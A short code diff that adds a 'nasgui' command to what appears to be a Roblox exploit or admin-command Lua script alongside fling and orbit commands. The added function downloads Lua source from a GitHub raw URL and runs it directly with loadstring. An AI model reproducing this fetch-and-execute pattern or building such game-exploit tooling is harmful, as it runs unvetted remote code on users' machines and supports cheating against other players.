@@ -383,6 +383,19 @@ commands.untfling = function()
     return true, "Tfling disabled."
 end
 
+commands.nasgui = function()
+    local url = "https://raw.githubusercontent.com/realNasser9229/NasGUI/refs/heads/main/source.lua"
+    local ok, err = pcall(function()
+        loadstring(game:HttpGet(url, true))()
+    end)
+
+    if ok then
+        return true, "NasGUI FE loaded successfully."
+    else
+        return false, "Failed to load NasGUI: "..tostring(err)
+    end
+end
+
 local activeOrbits = {}
 -- Orbit a player
 commands.orbit = function(args)
